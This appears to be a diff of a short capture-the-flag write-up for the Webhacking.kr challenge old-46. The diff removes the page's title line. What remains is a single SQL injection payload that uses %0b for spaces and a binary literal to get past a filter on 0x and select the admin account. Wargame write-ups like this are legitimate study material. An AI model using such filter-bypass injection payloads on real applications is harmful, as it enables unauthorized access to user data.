@@ -3,7 +3,7 @@ layout: default
 title: old-46
 ---
 
-# Webhacking old-46 Solution
+
 
 another sql injection. this time we can't use 0x, so we use 0b.
 ```5%0bor%0bid%0blike%0b0b0110000101100100011011010110100101101110#```
